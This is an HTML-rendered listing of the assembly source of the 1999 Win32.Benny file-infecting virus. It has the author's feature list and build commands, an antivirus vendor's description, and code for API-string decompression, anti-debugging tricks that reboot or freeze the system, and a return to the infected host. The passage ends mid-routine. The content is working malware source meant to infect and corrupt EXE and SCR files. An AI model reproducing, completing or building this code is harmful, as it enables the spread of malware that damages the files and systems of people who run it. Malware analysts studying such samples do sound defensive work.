<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Benny.3219.a - benny.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;-------------------------------------;</span><span class="sc0">
</span><span class="sc1">;    Win32.Benny (c) 1999 by Benny    ;</span><span class="sc0">
</span><span class="sc1">;-------------------------------------;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Author's description</span><span class="sc0">
</span><span class="sc1">;---------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Welcome to my second Win32 virus! Don't expect any new things, I only</span><span class="sc0">
</span><span class="sc1">;present u my last lame virus. Here is it...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Features:</span><span class="sc0">
</span><span class="sc1">;----------</span><span class="sc0">
</span><span class="sc1">;       -   Win32 infector</span><span class="sc0">
</span><span class="sc1">;       -   appends to the last section (usualy .reloc)</span><span class="sc0">
</span><span class="sc1">;       -   "already infected" mark as my spec. 64bit checksum.</span><span class="sc0">
</span><span class="sc1">;       -   no use of absolute addresses, gets GetModuleHandleA API from IAT</span><span class="sc0">
</span><span class="sc1">;       -   compressed (API strings only)</span><span class="sc0">
</span><span class="sc1">;       -   using memory mapped files for smarter handling of 'em</span><span class="sc0">
</span><span class="sc1">;       -   direct action</span><span class="sc0">
</span><span class="sc1">;       -   nonencrypted</span><span class="sc0">
</span><span class="sc1">;       -   armoured (using SEH), TD32 fails</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Targets:</span><span class="sc0">
</span><span class="sc1">;---------</span><span class="sc0">
</span><span class="sc1">;       -   *.EXE</span><span class="sc0">
</span><span class="sc1">;       -   *.SRC</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;How to build:</span><span class="sc0">
</span><span class="sc1">;--------------</span><span class="sc0">
</span><span class="sc1">;       -   tasm32 -ml -q -m4 benny.asm</span><span class="sc0">
</span><span class="sc1">;           tlink32 -Tpe -c -x -aa -r benny,,, import32</span><span class="sc0">
</span><span class="sc1">;           pewrsec benny.exe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;AVP's description</span><span class="sc0">
</span><span class="sc1">;------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Benny's notes r in "[* *]".</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This is a direct action (nonmemory resident) parasitic [* compressed *] Win32</span><span class="sc0">
</span><span class="sc1">;virus. It searches for PE EXE files in the Windows, Windows system and current</span><span class="sc0">
</span><span class="sc1">;directories [* shit! It DOESN'T infect Windows/System directories! *], then</span><span class="sc0">
</span><span class="sc1">;writes itself to the end of the file. The virus has bugs and in many cases</span><span class="sc0">
</span><span class="sc1">;corrupts files while infecting them [* Sorry, this is my last lame virus *].</span><span class="sc0">
</span><span class="sc1">;The virus checks file names and does not infect the files: RUNDLL32.EXE,</span><span class="sc0">
</span><span class="sc1">;TD32.EXE, TLINK32.EXE, TASM32.EXE [* and NTVDM.EXE *].  While infecting the</span><span class="sc0">
</span><span class="sc1">;virus increases the size of last file section, writes itself to there and</span><span class="sc0">
</span><span class="sc1">;modifies necessary PE header fields including program startup address. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus contains the "copyright" string: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Win32.Benny (c) 1999 by Benny</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;And here is that promised babe:</span><span class="sc0">




</span><span class="sc2">.386p</span><span class="sc0">                           </span><span class="sc1">;386 instructions</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">                     </span><span class="sc1">;32bit offset, no segments</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">PE.inc</span><span class="sc0">                      </span><span class="sc1">;include some useful files</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">MZ.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Useful.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Win32api.inc</span><span class="sc0">


</span><span class="sc5">nFile</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;constants for decompress stage</span><span class="sc0">
</span><span class="sc5">nGet</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">nSet</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">nModule</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">nHandle</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">nCreate</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">nFind</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">nFirst</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">nNext</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc5">nClose</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">nViewOf</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">nDirectoryA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">nEXE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">13</span><span class="sc0">


</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">             </span><span class="sc1">;APIs needed by first generation</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">


</span><span class="sc9">.data</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">;shut up, tlink32 !</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">Start_Virus</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                      </span><span class="sc1">;save all regs</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc0">

</span><span class="sc5">ve_strings</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;compressed APIs</span><span class="sc0">
    </span><span class="sc5">veszKernel32</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'KERNEL32'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszGetModuleHandleA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">nGet</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nModule</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">veszGetVersion</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">nGet</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Version'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszIsDebuggerPresent</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'IsDebuggerPresent'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszCreateFileA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">nCreate</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszFindFirstFileA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">nFind</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nFirst</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszFindNextFileA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">nFind</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nNext</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszFindClose</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">nFind</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nClose</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszSetFileAttributesA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">nSet</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'AttributesA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszCloseHandle</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">nClose</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszCreateFileMappingA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">nCreate</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'MappingA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszMapViewOfFile</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Map'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nViewOf</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszUnmapViewOfFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Unmap'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nViewOf</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszSetFilePointer</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">nSet</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Pointer'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszSetEndOfFile</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">nSet</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EndOf'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszSetFileTime</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">nSet</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Time'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszGetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">nGet</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Windows'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nDirectoryA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszGetSystemDirectoryA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">nGet</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'System'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nDirectoryA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszGetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">nGet</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Current'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nDirectoryA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">veszExe</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nEXE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszScr</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.SCR'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">veszNames</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'NTVDM'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nEXE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;files, which we wont</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'RUNDLL32'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nEXE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;infect</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'TD32'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nEXE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'TLINK32'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nEXE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'TASM32'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nEXE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszNumberOfNamez</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">5</span><span class="sc0">

    </span><span class="sc5">end_ve_stringz</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ffh</span><span class="sc0">                </span><span class="sc1">;end of compressed</span><span class="sc0">
                                    </span><span class="sc1">;strings</span><span class="sc0">
</span><span class="sc5">string_subs</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;string substitutes</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'File'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Get'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Set'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Module'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Handle'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Create'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Find'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'First'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Next'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Close'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'ViewOf'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'DirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">num</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">14</span><span class="sc0">                  </span><span class="sc1">;number of 'em</span><span class="sc0">

</span><span class="sc5">gdelta</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;get delta offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ve_strings</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">v_strings</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">next_ch</span><span class="sc4">:</span><span class="sc6">lodsb</span><span class="sc0">                       </span><span class="sc1">;decompressing stage</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">copy_b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_unpacking</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">num</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">packed</span><span class="sc0">
</span><span class="sc5">copy_b</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_ch</span><span class="sc0">
</span><span class="sc5">packed</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">string_subs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc5">packed2</span><span class="sc4">:</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_inc_</span><span class="sc0">
</span><span class="sc5">packed3</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">un_pck</span><span class="sc0">
</span><span class="sc5">p_cpy</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">p_cpy</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_ch</span><span class="sc0">
</span><span class="sc5">un_pck</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">packed3</span><span class="sc0">
</span><span class="sc5">_inc_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">un_pck</span><span class="sc0">

</span><span class="sc5">seh_fn</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">                </span><span class="sc1">;remove exception frame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                       </span><span class="sc1">;heal stack</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyGetVersion</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get version of windoze</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">              </span><span class="sc1">;WinNT ?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">NT_debug_trap</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a04h</span><span class="sc0">                   </span><span class="sc1">;Win95 ?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">seh_rs</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IsDebugger</span><span class="sc0">                 </span><span class="sc1">;Win98, check, if debugger active</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">seh_rs</span><span class="sc0">                    </span><span class="sc1">;no, continue</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">909119cdh</span><span class="sc0">              </span><span class="sc1">;yeah, reboot system</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">NT_debug_trap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IsDebugger</span><span class="sc0">                 </span><span class="sc1">;WinNT, check, if debugger active</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">seh_rs</span><span class="sc0">                    </span><span class="sc1">;no, continue</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                    </span><span class="sc1">;yeah, freeze app</span><span class="sc0">

</span><span class="sc5">IsDebugger</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyIsDebuggerPresent</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;call checkin API</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">quit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrigEPoint</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get original entrypoint rva</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">400000h</span><span class="sc0">               </span><span class="sc1">;make it raw pointer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;jump to host</span><span class="sc0">

</span><span class="sc5">end_unpacking</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vszKernel32</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;KERNEL32</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
